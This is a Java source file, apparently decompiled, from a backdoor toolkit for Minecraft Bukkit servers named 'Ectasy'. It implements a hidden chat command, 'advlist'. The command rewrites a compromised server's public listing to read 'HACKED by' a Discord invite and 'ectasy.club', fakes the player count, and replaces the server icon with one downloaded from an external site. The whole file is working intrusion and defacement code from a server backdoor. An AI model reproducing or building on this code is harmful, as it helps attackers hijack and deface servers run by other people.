package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.awt.image.BufferedImage;
import java.net.URL;
import java.net.URLConnection;
import javax.imageio.ImageIO;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.util.CachedServerIcon;

@CommandInfo(
   name = "advlist",
   description = "Advertise ectasy on server list",
   blatant = true,
   rank = Rank.LITE
)
public class AdvertisementCommand extends AbstractCommand implements Listener {
   public boolean advert = false;
   public CachedServerIcon icon = null;

   @EventHandler
   public void onServerPing(ServerListPingEvent var1) {
      if (this.advert) {
         var1.setMotd(
            ChatColor.DARK_RED
               + ""
               + ChatColor.BOLD
               + "HACKED"
               + ChatColor.GOLD
               + " by "
               + ChatColor.AQUA
               + Ectasy.discordInviteLink
               + ChatColor.GOLD
               + " | "
               + ChatColor.AQUA
               + "ectasy.club"
         );
         var1.setMaxPlayers(6969);
         if (this.icon != null) {
            var1.setServerIcon(this.icon);
         }
      }
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      this.advert = true;
      ChatUtil.sendChat(var1.getPlayer(), "Enabled advertising on server list.");

      try {
         URLConnection var4 = new URL("https://bodyalhoha.com/ectasylogo_64x64.png").openConnection();
         var4.addRequestProperty("User-Agent", "Mozilla");
         BufferedImage var5 = ImageIO.read(var4.getInputStream());
         this.icon = Bukkit.loadServerIcon(var5);
      } catch (Exception ignored) {
      }
   }
}
